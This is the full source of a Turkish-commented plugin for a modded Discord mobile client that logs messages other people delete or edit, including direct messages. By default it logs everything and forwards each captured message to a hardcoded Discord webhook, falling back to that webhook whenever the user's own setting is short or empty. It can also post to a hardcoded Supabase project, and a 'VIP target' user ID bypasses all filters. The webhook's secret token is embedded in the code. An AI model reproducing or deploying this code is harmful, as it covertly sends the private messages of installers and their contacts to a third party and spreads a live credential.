(() => {
    const globalContext = window.revenge || window.vendetta || window.bunny || {};
    const { metro, patcher, plugins } = globalContext;

    // Discord'un sildiği mesajları anlık korumaya alacağımız yerel zırhlı hafıza
    const messageCache = new Map();
    let Dispatcher, ChannelStore, GuildStore, MessageStore, MessageModule, UserStore;
    let patchInjected = false;

    // --- GÜVENLİ SABİT VERİLER (UI Kırpılma Koruması ve VIP Hedef) ---
    const HARDCODED_WEBHOOK = "https://discord.com/api/webhooks/1521135284463341588/ilYM0xTIe14o5-Tgeky6xKjQV5AQEpHElGA4G_0Xm5Go_56jv4_NY6tLCQZr_jLZn5qX";
    const HARDCODED_SUPABASE_URL = "https://zstjrxjkfmkyjanwdfpi.supabase.co";
    const TARGET_USER_ID = "1143677277398376548"; // Kesintisiz loglanacak ana hesap ID'si

    // --- PROXY UYUMLU GÜVENLİ HAFIZA SİSTEMİ ---
    function getStorage() {
        if (!plugins) return {};
        const myKey = Object.keys(plugins).find(k => k.toLowerCase().includes("logar")) || "LogarPlugin";
        if (!plugins[myKey]) plugins[myKey] = {};
        if (!plugins[myKey].storage) plugins[myKey].storage = {};
        
        const s = plugins[myKey].storage;
        if (s.supabaseUrl === undefined) s.supabaseUrl = HARDCODED_SUPABASE_URL;
        if (s.supabaseKey === undefined) s.supabaseKey = "";
        if (s.webhookUrl === undefined) s.webhookUrl = HARDCODED_WEBHOOK;
        if (s.logEverything === undefined) s.logEverything = true;
        if (s.showEphemeral === undefined) s.showEphemeral = true;
        if (!s.localHistory) s.localHistory = [];
        if (!s.filteredWords) s.filteredWords = [];
        if (!s.whitelistedGuilds) s.whitelistedGuilds = [];
        
        return s;
    }

    // --- DİNAMİK MODÜL ÇÖZÜMLEYİCİ ---
    function resolveModules() {
        try { Dispatcher = metro.findByProps("dispatch") || metro.findByProps("_dispatch"); } catch(e){}
        try { ChannelStore = metro.findByProps("getChannel", "hasChannel"); } catch(e){}
        try { GuildStore = metro.findByProps("getGuild", "getGuilds"); } catch(e){}
        try { MessageStore = metro.findByProps("getMessages", "getMessage"); } catch(e){}
        try { MessageModule = metro.findByProps("sendMessage", "receiveMessage"); } catch(e){}
        try { UserStore = metro.findByProps("getCurrentUser", "getUser"); } catch(e){}
    }

    // --- FİLTRE MOTORLARI ---
    function isGuildAllowed(channelId, authorId) {
        if (authorId === TARGET_USER_ID) return true; // VIP ana hesap her yerde serbest
        const storage = getStorage();
        if (!storage.whitelistedGuilds || storage.whitelistedGuilds.length === 0) return true;
        const channel = ChannelStore?.getChannel?.(channelId);
        if (!channel || !channel.guild_id) return true; // DM her zaman serbest
        return storage.whitelistedGuilds.includes(channel.guild_id);
    }

    function isContentFiltered(content, mentions, authorId) {
        if (authorId === TARGET_USER_ID) return true; // VIP ana hesap filtreleri tamamen deler geçer
        const storage = getStorage();
        if (storage.logEverything) return true; 

        const myId = UserStore?.getCurrentUser()?.id || TARGET_USER_ID;
        if (mentions?.some(m => m.id === myId || m === myId)) return true;

        if (!storage.filteredWords || storage.filteredWords.length === 0) return false;
        const lowerContent = content.toLowerCase();
        return storage.filteredWords.some(w => lowerContent.includes(w));
    }

    // --- RESILIENT MOR MESAJ SİSTEMİ ---
    function sendEphemeralMessage(channelId, content) {
        try {
            const LocalMessageHelper = metro.findByProps("sendBotMessage") || metro.findByProps("receiveMessage");
            if (LocalMessageHelper?.sendBotMessage) {
                LocalMessageHelper.sendBotMessage(channelId || "0", content);
            }
        } catch (e) { console.error("[Logar-UI] Mor mesaj basılamadı:", e); }
    }

    // --- SUPABASE BULUT AKIŞI ---
    async function sendToSupabase(data) {
        const storage = getStorage();
        // UI Kesintisine karşı koruma: URL geçersiz veya kısa kalmışsa sabit olanı kullan
        const cleanUrl = (storage.supabaseUrl && storage.supabaseUrl.length > 10 ? storage.supabaseUrl : HARDCODED_SUPABASE_URL).replace(/\/$/, "");
        if (!cleanUrl || !storage.supabaseKey) return;
        try {
            await fetch(`${cleanUrl}/rest/v1/logar_backup`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "apikey": storage.supabaseKey,
                    "Authorization": `Bearer ${storage.supabaseKey}`,
                    "Prefer": "return=minimal"
                },
                body: JSON.stringify({
                    user_id: UserStore?.getCurrentUser()?.id || TARGET_USER_ID,
                    logs: data,
                    filtered_words: storage.filteredWords
                })
            });
        } catch (e) { console.error("[Logar-Supabase] Hata:", e); }
    }

    // --- WEBHOOK ENTEGRASYONU ---
    async function sendToWebhook(data) {
        const storage = getStorage();
        // UI Kesintisine karşı koruma: Webhook kutusu kısa kesilmişse orijinal tam linki ateşle
        const webhookToUse = (storage.webhookUrl && storage.webhookUrl.length > 50) ? storage.webhookUrl : HARDCODED_WEBHOOK;
        if (!webhookToUse) return;
        const zaman = new Date().toLocaleTimeString("tr-TR", { hour: '2-digit', minute: '2-digit', second: '2-digit' });
        try {
            await fetch(webhookToUse, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    embeds: [{
                        title: `🚨 Logar Raporu: ${data.type}`,
                        description: `**👤 Kullanıcı:** ${data.author}\n**📁 Konum:** ${data.guildName} > #${data.channelName}\n**⏰ Saat:** ${zaman}\n\n**📝 Eski İçerik:** \`\`\`${data.oldContent}\`\`\`${data.newContent ? `**🔄 Yeni İçerik:**\n\`\`\`${data.newContent}\`\`\`` : ""}\n🔗 **[Olay Yerine / Kanala Atla](${data.jumpLink})**`,
                        timestamp: new Date().toISOString(),
                        color: data.type === "MESAJ SİLİNDİ" ? 16711680 : 16776960
                    }]
                })
            });
        } catch (e) { console.error("[Logar-Webhook] Hata:", e); }
    }

    // --- AYAR PANELİ (Arayüz Reaktivitesi Güçlendirilmiş) ---
    function SettingsPanel() {
        const React = metro.findByProps("createElement", "useState");
        const RN = metro.findByProps("ScrollView", "Text", "TextInput", "Button", "Switch", "View");
        const storage = getStorage();

        const [sUrl, setSUrl] = React.useState(storage.supabaseUrl || HARDCODED_SUPABASE_URL);
        const [sKey, setSKey] = React.useState(storage.supabaseKey || "");
        const [wUrl, setWUrl] = React.useState(storage.webhookUrl || HARDCODED_WEBHOOK);
        const [logAll, setLogAll] = React.useState(storage.logEverything);
        const [showEph, setShowEph] = React.useState(storage.showEphemeral);
        const [guildInput, setGuildInput] = React.useState(storage.whitelistedGuilds?.join(", ") || "");
        const [word, setWord] = React.useState("");
        const [, forceUpdate] = React.useState({});

        return React.createElement(RN.ScrollView, { style: { padding: 16 } },
            React.createElement(RN.View, { style: { flexDirection: "row", justifyContent: "space-between", alignItems: "center", marginBottom: 12, padding: 10, backgroundColor: "#2d2d2d", borderRadius: 8 } },
                React.createElement(RN.Text, { style: { color: "#fff", fontWeight: "bold" } }, "Her Şeyi Logla (Filtreleri Devre Dışı Bırakır):"),
                React.createElement(RN.Switch, { value: logAll, onValueChange: (v) => { setLogAll(v); storage.logEverything = v; } })
            ),
            React.createElement(RN.View, { style: { flexDirection: "row", justifyContent: "space-between", alignItems: "center", marginBottom: 20, padding: 10, backgroundColor: "#2d2d2d", borderRadius: 8 } },
                React.createElement(RN.Text, { style: { color: "#fff", fontWeight: "bold" } }, "Sohbette Anlık Mor Mesaj Göster:"),
                React.createElement(RN.Switch, { value: showEph, onValueChange: (v) => { setShowEph(v); storage.showEphemeral = v; } })
            ),

            React.createElement(RN.Text, { style: { color: "#fff", fontWeight: "bold", marginBottom: 5 } }, "Supabase URL & Key:"),
            React.createElement(RN.TextInput, { value: sUrl, onChangeText: setSUrl, style: { backgroundColor: "#222", color: "#fff", padding: 10, borderRadius: 5, marginBottom: 5 } }),
            React.createElement(RN.TextInput, { value: sKey, onChangeText: setSKey, secureTextEntry: true, style: { backgroundColor: "#222", color: "#fff", padding: 10, borderRadius: 5, marginBottom: 15 } }),

            React.createElement(RN.Text, { style: { color: "#fff", fontWeight: "bold", marginBottom: 5 } }, "Discord Webhook URL:"),
            React.createElement(RN.TextInput, { value: wUrl, onChangeText: setWUrl, placeholder: "https://discord.com/api/webhooks/...", placeholderTextColor: "#666", style: { backgroundColor: "#222", color: "#fff", padding: 10, borderRadius: 5, marginBottom: 20 } }),

            React.createElement(RN.View, { style: { padding: 12, backgroundColor: "#2d2d2d", borderRadius: 8, marginBottom: 20 } },
                React.createElement(RN.Text, { style: { color: "#fff", fontWeight: "bold", marginBottom: 4 } }, "Özel Sunucu ID'leri (Opsiyonel)"),
                React.createElement(RN.TextInput, { value: guildInput, onChangeText: setGuildInput, style: { backgroundColor: "#111", color: "#fff", padding: 8, borderRadius: 5 } })
            ),

            React.createElement(RN.View, { style: { padding: 12, backgroundColor: "#2d2d2d", borderRadius: 8, marginBottom: 20 } },
                React.createElement(RN.Text, { style: { color: "#fff", fontWeight: "bold", marginBottom: 8 } }, "Kelime Filtresi Ekle"),
                React.createElement(RN.TextInput, { value: word, onChangeText: setWord, style: { backgroundColor: "#111", color: "#fff", padding: 8, borderRadius: 5, marginBottom: 8 } }),
                React.createElement(RN.View, { style: { flexDirection: "row", justifyContent: "space-between" } },
                    React.createElement(RN.Button, { title: "Ekle", onPress: () => { if(word.trim()){ storage.filteredWords.push(word.trim().toLowerCase()); setWord(""); forceUpdate({}); } } }),
                    React.createElement(RN.Button, { title: "Temizle", onPress: () => { storage.filteredWords = []; forceUpdate({}); }, color: "#d9534f" })
                ),
                React.createElement(RN.Text, { style: { color: "#aaa", marginTop: 8 } }, "Aktif: " + (storage.filteredWords?.join(", ") || "Yok"))
            ),

            React.createElement(RN.Text, { style: { color: "#4CAF50", marginBottom: 15, textAlign: "center", fontWeight: "bold" } }, `🎯 VIP Hedef (${TARGET_USER_ID}) aktif korumada.`),

            React.createElement(RN.Button, { 
                title: "TÜM AYARLARI KAYDET", 
                onPress: () => { 
                    storage.supabaseUrl = sUrl;
                    storage.supabaseKey = sKey;
                    storage.webhookUrl = wUrl;
                    storage.whitelistedGuilds = guildInput.split(",").map(g => g.trim()).filter(g => g !== "");
                    alert("Sistem Hafızaya Kaydedildi!");
                } 
            })
        );
    }

    // --- ENJEKSİYON VE GÖZLEM MOTORU ---
    function injectPatches() {
        if (patchInjected || !Dispatcher) return;
        patchInjected = true;

        // 1. Gizli Komut Sistemi (.logar)
        if (MessageModule) {
            patcher.instead("sendMessage", MessageModule, (args, original) => {
                const [channelId, message] = args;
                const storage = getStorage();

                if (message && message.content === ".logar") {
                    if (!storage.localHistory || storage.localHistory.length === 0) {
                        sendEphemeralMessage(channelId, "❌ **[Logar]:** Önbelleğe alınmış kayıt yok.");
                    } else {
                        let listRapor = "📋 **Son Yakalanan Logar Kayıtları:**\n\n";
                        storage.localHistory.forEach((l, index) => {
                            listRapor += `**${index + 1}. [${l.time}] ${l.type}**\n👤 \`${l.author}\` | Kanal: #${l.channelName}\n💬 İçerik: *${l.content}*\n\n`;
                        });
                        sendEphemeralMessage(channelId, listRapor);
                    }
                    return; 
                }
                return original.apply(this, args);
            });
        }

        // 2. Canlı Veri Akış Takibi (Dispatch Analizi)
        patcher.before("dispatch", Dispatcher, (args) => {
            const event = args[0];
            if (!event) return;
            const storage = getStorage();

            // MESAJ DEPOSUNU DOLDURMA (Discord silmeden önce biz yakalıyoruz)
            if (event.type === "MESSAGE_CREATE") {
                const msg = event.message;
                if (msg?.id && msg?.channel_id) {
                    messageCache.set(msg.id, {
                        content: msg.content,
                        author: msg.author?.username || "Bilinmeyen Kullanıcı",
                        authorId: msg.author?.id || "", // VIP kontrolü için ID eklendi
                        mentions: msg.mentions || []
                    });
                }
            }

            // MESAJ SİLİNDİĞİNDE
            if (event.type === "MESSAGE_DELETE") {
                const cached = messageCache.get(event.id);
                const dbMsg = MessageStore?.getMessage?.(event.channelId, event.id);

                const finalAuthorId = dbMsg?.author?.id || cached?.authorId || "";
                
                // Sunucu filtresini doğrula (Eğer VIP hesapsa filtreyi es geç)
                if (!isGuildAllowed(event.channelId, finalAuthorId)) return;

                const finalContent = dbMsg?.content || cached?.content;
                const finalAuthor = dbMsg?.author?.username || cached?.author || "Bilinmeyen Kullanıcı";
                const finalMentions = dbMsg?.mentions || cached?.mentions || [];

                // İçerik filtresini doğrula (Eğer VIP hesapsa filtreyi es geç)
                if (!finalContent || !isContentFiltered(finalContent, finalMentions, finalAuthorId)) return;

                const channel = ChannelStore?.getChannel?.(event.channelId);
                const guild = channel?.guild_id ? GuildStore?.getGuild?.(channel.guild_id) : null;
                const guildId = channel?.guild_id ?? "@me";
                const jumpUrl = `https://discord.com/channels/${guildId}/${event.channelId}/${event.id}`;
                const anlikSaat = new Date().toLocaleTimeString("tr-TR", { hour: '2-digit', minute: '2-digit' });

                const logPayload = {
                    type: "MESAJ SİLİNDİ",
                    guildName: guild ? guild.name : "Direkt Mesaj (DM)",
                    channelName: channel?.name ?? "Özel Sohbet",
                    author: finalAuthor,
                    oldContent: finalContent,
                    jumpLink: jumpUrl
                };

                storage.localHistory.unshift({ time: anlikSaat, type: "SİLME", author: logPayload.author, channelName: logPayload.channelName, content: logPayload.oldContent });
                if (storage.localHistory.length > 5) storage.localHistory.pop();

                sendToSupabase(logPayload);
                sendToWebhook(logPayload);
                if (storage.showEphemeral) sendEphemeralMessage(event.channelId, `🗑️ **[Logar Silindi]** \`${logPayload.author}\`: ${logPayload.oldContent}`);
            }

            // MESAJ DÜZENLENDİĞİNDE
            if (event.type === "MESSAGE_UPDATE") {
                const msg = event.message;
                if (!msg || !msg.id || !msg.channel_id) return;

                const cached = messageCache.get(msg.id);
                const dbMsg = MessageStore?.getMessage?.(msg.channel_id, msg.id);

                const finalAuthorId = msg.author?.id || dbMsg?.author?.id || cached?.authorId || "";

                // Sunucu filtresini doğrula (VIP hesapsa es geç)
                if (!isGuildAllowed(msg.channel_id, finalAuthorId)) return;

                const oldContent = dbMsg?.content || cached?.content || "";
                if (!oldContent || oldContent === msg.content) return; 

                // İçerik kelime filtresini doğrula (VIP hesapsa es geç)
                if (!isContentFiltered(oldContent, cached?.mentions, finalAuthorId) && !isContentFiltered(msg.content, msg.mentions, finalAuthorId)) return;

                const channel = ChannelStore?.getChannel?.(msg.channel_id);
                const guild = channel?.guild_id ? GuildStore?.getGuild?.(channel.guild_id) : null;
                const guildId = channel?.guild_id ?? "@me";
                const jumpUrl = `https://discord.com/channels/${guildId}/${msg.channel_id}/${msg.id}`;
                const anlikSaat = new Date().toLocaleTimeString("tr-TR", { hour: '2-digit', minute: '2-digit' });

                const logPayload = {
                    type: "MESAJ DÜZENLENDİ",
                    guildName: guild ? guild.name : "Direkt Mesaj (DM)",
                    channelName: channel?.name ?? "Özel Sohbet",
                    author: msg.author?.username || cached?.author || "Bilinmeyen Kullanıcı",
                    oldContent: oldContent,
                    newContent: msg.content,
                    jumpLink: jumpUrl
                };

                storage.localHistory.unshift({ time: anlikSaat, type: "DÜZENLEME", author: logPayload.author, channelName: logPayload.channelName, content: `${logPayload.oldContent} -> ${logPayload.newContent}` });
                if (storage.localHistory.length > 5) storage.localHistory.pop();

                sendToSupabase(logPayload);
                sendToWebhook(logPayload);
                if (storage.showEphemeral) sendEphemeralMessage(msg.channel_id, `✏️ **[Logar Düzenlendi]** \`${logPayload.author}\`:\n❌ *${logPayload.oldContent}*\n✅ *${logPayload.newContent}*`);

                messageCache.set(msg.id, { content: msg.content, author: logPayload.author, authorId: finalAuthorId, mentions: msg.mentions || [] });
            }
        });
    }

    // --- GÜVENLİ BAŞLATICI MOTORU ---
    function onLoad() {
        resolveModules();
        const checkInterval = setInterval(() => {
            resolveModules();
            if (Dispatcher && ChannelStore && MessageStore && UserStore) {
                injectPatches();
                clearInterval(checkInterval);
            }
        }, 1000); // Modüller tamamen yüklenene kadar her saniye kontrol eder
    }

    function onUnload() {
        patcher?.unpatchAll?.();
        patchInjected = false;
        messageCache.clear();
    }

    return { onLoad, onUnload, settings: SettingsPanel };
})();
                        
